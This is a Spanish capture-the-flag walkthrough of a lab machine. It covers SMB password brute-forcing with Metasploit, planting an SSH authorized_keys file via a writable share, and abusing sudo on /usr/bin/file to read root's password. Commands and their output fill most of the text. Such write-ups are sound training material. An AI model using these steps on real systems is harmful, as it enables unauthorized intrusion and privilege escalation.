@@ -1,0 +1,212 @@
+# 1 Enumeracion de Puertos, servicios y versiones
+
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.17.0.2 -oN nmap 
+
+21/tcp  open  ftp         syn-ack ttl 64 vsftpd 3.0.5
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+
+servicios levantados: smb, ssh y ftp
+
+probaremos por ftp como anonymous
+
+ftp anonymous@172.17.0.2							| tenemos acceso
+ftp> ls
+-rw-r--r--    1 0        0              69 Aug 19 19:03 nota.txt
+ftp> get nota.txt								| nos descargamos el archivo a nuestro equipo
+
+===============================
+desde nuestro equipo:
+cat nota.txt
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+I don't know what to do with Macarena, she's obsessed with donald.
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+podriamos tener a macarena como posible usuario, pero como tenemos smb
+intentaremos listar usuarios con rpcclient
+
+rpcclient -U '' -N 172.17.0.2
+rpcclient $> enumdomusers							| listamos usuarios
+user:[macarena] rid:[0x3e8]							| macarena si es un usuario smb
+
+smbmap -u 'macarena' -H 172.17.0.2						| necesitamos la clave
+
+aplicaremos fuerza bruta al servicio smb con metasploit
+
+msfconsole -q
+use auxiliary/scanner/smb/smb_login
+set PASS_FILE /home/darks/Desktop/Kali/diccionarios/rockyou.txt
+set RHOSTS 172.17.0.2
+set SMBUser macarena
+run
+[+] 172.17.0.2:445        - 172.17.0.2:445 - Success: '.\macarena:donald'
+
+
+conseguimos la clave (macarena si que esta obsecionada con donald xd)
+listamos los recursos compartidos con smbmap
+
+smbmap -u 'macarena' -p 'donald' -H 172.17.0.2
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 172.17.0.2:445	Name: collections.dl			Status: Authenticated
+	Disk							Permissions	Comment
+	----							-----------	-------
+	print$							READ ONLY	Printer Drivers
+	macarena						READ, WRITE	
+	IPC$							NO ACCESS	IPC Service (8842f8bccb3e server (Samba, Ubuntu))
+[*] Closed 1 connections     
+
+
+como vemos que tenemos permisos de escritura y lectura en el directorio macarena, nos conectaremos via smbclient
+
+smbclient //172.17.0.2/macarena -U macarena%donald
+smb: \> ls
+
+.                                   D        0  Wed Aug 28 16:36:43 2024
+  ..                                  D        0  Wed Aug 28 16:36:43 2024
+  .bash_history                       H        5  Mon Aug 19 13:26:02 2024
+  user.txt                            N       33  Mon Aug 19 12:20:25 2024
+  .bashrc                             H     3771  Mon Aug 19 12:18:51 2024
+  .cache                             DH        0  Mon Aug 19 12:40:39 2024
+  .profile                            H      807  Mon Aug 19 12:18:51 2024
+  .bash_logout                        H      220  Mon Aug 19 12:18:51 2024
+
+smb: \> get user.txt
+
+getting file \user.txt of size 33 as user.txt (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
+
+
+==================================================================================================
+
+como nos hemos descargado el archivo, lo leemos en nuestro equipo
+
+cat user.txt
+
+ef65ad731de0ebabcb371fa3ad4972f1
+
+parece ser un hash, intente crackearlo con john y hashcat pero no obtuve resultados....
+realice un ataque de diccionario al servicio ssh pero sin resultados.....
+lo que se me ocurre intentar es crear el directorio .ssh e intentar acceder por esa via
+crear las claves publicas y privadas para acceder sin clave....
+
+===================================================================================================
+
+smb: \> mkdir .ssh
+smb: \> cd .ssh
+
+===================================================================================================
+
+ahora nos vamos a crear un par de claves ssh desde nuestro equipo y subirlas luego al directorio .ssh
+
+===================================================================================================
+
+ssh-keygen -t rsa -b 4096
+
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+/root/.ssh/id_rsa already exists.
+Overwrite (y/n)? y
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:+2PIBis/rhSpuuzXNniIYpJwxejFHtABKHTMY1qXARM root@DARKS
+The key's randomart image is:
++---[RSA 4096]----+
+|.o+E+oo          |
+|o o*oo           |
+|. +=o            |
+| .. *.           |
+| . +o.  S        |
+|. o....  .       |
+|.oo =  +..       |
+|=+ =.=o +.o      |
+|B+. +=+o ...     |
++----[SHA256]-----+
+
+
+nos traemos al directorio actual la llave publica y privada generadas
+
+cp /root/.ssh/id_rsa .
+cp /root/.ssh/id_rsa.pub .
+cp id_rsa.pub authorized_keys						| creamos una copia cambiando el nombre
+
+ahora subiremos al directorio creado .ssh via smbclient
+
+smb: \.ssh\> put authorized_keys
+smb: \.ssh\> put id_rsa.pub
+
+ya con los archivos cargados, intentaremos conectarnos via ssh haciendo uso de id_rsa
+
+=====================================
+
+desde nuestro equipo atacante, nos conectamos via ssh
+
+ssh -i id_rsa macarena@172.17.0.2
+
+logramos el acceso via ssh sin tener la clave de macarena...
+
+
+# Escalada de privilegios
+
+sudo -l					| nos solicita clave
+find / -perm -4000 2>/dev/null		| no conseguimos nada
+ls
+user.txt				| el archivo que ya habias descargado antes
+cd ..
+ls
+
+ftp  macarena  secret
+
+cd secret
+ls
+hash
+cat hash
+MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
+
+========================================================================================
+
+parece que fuera un base64, pero termina con 3 =, asi que no creo, intentare con base32
+
+echo 'MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===' |base32 -d
+c3VwZXJzZWN1cmVwYXNzd29yZA==
+
+echo 'c3VwZXJzZWN1cmVwYXNzd29yZA==' |base64 -d
+supersecurepassword
+
+intentamos elevar a root pero no es su clave, pero puede ser de macarena asi que probaremos
+
+sudo -l
+pass: supersecurepassword
+
+User macarena may run the following commands on 8842f8bccb3e:
+    (ALL : ALL) /usr/bin/file
+
+==================================================
+es la passwd de macarena y tenemos el binario file
+del que podremos abusar para escalar
+==================================================
+
+en gtfobins buscamos el binario y podemos abusar de el leyendo archivos que solo pueda leer root
+
+sudo file -f $LFILE
+
+
+===================================================
+
+despues de buscar y buscar nos conseguirmos con un archivo en /opt/password.txt
+que solo root puede leerlo, asi que podemos usar file para ver su contenido
+como indica GTFOBINS
+
+sudo /usr/bin/file -f /opt/password.txt
+root:rooteable2: cannot open `root:rooteable2' (No such file or directory)
+
+conseguimos leerlo y ver que contenia la clave de root, asi que escalamos
+
+su root
+pass: rooteable2
+whoami
+#root
